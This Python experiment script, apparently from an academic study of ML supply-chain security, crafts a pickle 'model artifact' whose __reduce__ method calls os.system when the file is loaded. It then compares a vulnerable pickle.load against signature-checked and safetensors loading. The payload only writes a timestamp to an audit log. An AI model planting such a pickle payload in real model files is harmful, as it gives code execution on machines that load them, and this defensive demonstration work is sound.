import os
import pickle
import time
from pathlib import Path
from typing import Dict, Any

import config
from pipeline.crypto_signer import ModelConsumerVerifier
from pipeline.train import load_model_safetensors

AUDIT_PROOF_FILE = config.REPORTS_DIR / "deserialization_audit_proof.log"

class MaliciousArtifactProbe:
    """
    Academic demonstration object leveraging Python __reduce__ stack machine opcode.
    Demonstrates arbitrary code execution during pickle unpickling without weaponized malware.
    Aligns with Chapter 3.2 and 5.2.
    """
    def __init__(self, message: str = "DEMO_ARBITRARY_CODE_EXECUTION_TRIGGERED"):
        self.message = message

    def __reduce__(self):
        # The __reduce__ method returns a callable and a tuple of arguments.
        # Python's unpickler executes this callable immediately upon encountering the REDUCE opcode.
        # Execute python inline at deserialization time to record the true execution timestamp in worker context
        cmd = f'python -c "import time; open(r\'{AUDIT_PROOF_FILE}\', \'w\').write(f\'[SECURITY AUDIT TRACE] Executed at runtime: {{time.time()}} in worker process\\n\')"'
        return (os.system, (cmd,))

def craft_malicious_artifact(output_path: Path = config.ARTIFACTS_DIR / "tampered_model.pkl"):
    """Serializes the probe object simulating a compromised model artifact in bucket storage."""
    probe = MaliciousArtifactProbe()
    with open(output_path, "wb") as f:
        pickle.dump(probe, f)
    print(f"[Attack Sim] Crafted serialized payload artifact -> {output_path}")
    return output_path

def test_vulnerable_loading(artifact_path: Path) -> Dict[str, Any]:
    """Test 1: Vulnerable worker loads pickle directly."""
    if AUDIT_PROOF_FILE.exists():
        AUDIT_PROOF_FILE.unlink()

    print("[Vulnerable Worker] Loading model from untrusted storage...")
    try:
        with open(artifact_path, "rb") as f:
            _ = pickle.load(f)
        
        executed = AUDIT_PROOF_FILE.exists()
        return {
            "vulnerability_reproduced": executed,
            "status": "EXPLOITED" if executed else "SAFE",
            "audit_file": str(AUDIT_PROOF_FILE) if executed else None
        }
    except Exception as e:
        return {"vulnerability_reproduced": False, "status": "ERROR", "error": str(e)}

def test_cryptographic_defense(artifact_path: Path) -> Dict[str, Any]:
    """Test 2: Hardened worker verifies digital signature prior to unpickling."""
    verifier = ModelConsumerVerifier(config.PUBLIC_KEY_FILE)
    # Looking for signature file
    sig_path = artifact_path.with_suffix(".sig")
    print("[Hardened Worker] Verifying digital signature before deserialization...")

    is_valid = verifier.verify_artifact(artifact_path, sig_path)
    if not is_valid:
        print("[Hardened Worker] PREVENTED: Signature invalid or absent. Deserialization aborted.")
        return {
            "defense_successful": True,
            "signature_valid": False,
            "code_executed": False
        }

    # Only reaches here if signature was valid
    with open(artifact_path, "rb") as f:
        _ = pickle.load(f)
    return {"defense_successful": False, "signature_valid": True, "code_executed": True}

def test_safetensors_defense(safetensors_path: Path) -> Dict[str, Any]:
    """Test 3: Loading static Safetensors format."""
    print("[Hardened Worker] Loading model via Safetensors...")
    try:
        model = load_model_safetensors(safetensors_path)
        return {
            "defense_successful": True,
            "format": "safetensors",
            "arbitrary_execution_possible": False,
            "model_ready": model is not None
        }
    except Exception as e:
        return {"defense_successful": False, "error": str(e)}

def run_experiment_1():
    print("=" * 70)
    print("EXPERIMENT 1: Insecure Deserialization Analysis & Remediation")
    print("=" * 70)
    
    payload_file = craft_malicious_artifact()

    # Step 1: Run attack against vulnerable loader
    vuln_res = test_vulnerable_loading(payload_file)
    print(f"Result (Vulnerable): {vuln_res}")

    # Step 2: Run attack against cryptographically signed loader
    crypto_res = test_cryptographic_defense(payload_file)
    print(f"Result (Crypto Defense): {crypto_res}")

    # Step 3: Run secure format (Safetensors)
    safe_res = test_safetensors_defense(config.SECURE_MODEL_SAFETENSORS)
    print(f"Result (Safetensors): {safe_res}")

    return {
        "vulnerable": vuln_res,
        "crypto_defense": crypto_res,
        "safetensors": safe_res
    }

if __name__ == "__main__":
    run_experiment_1()
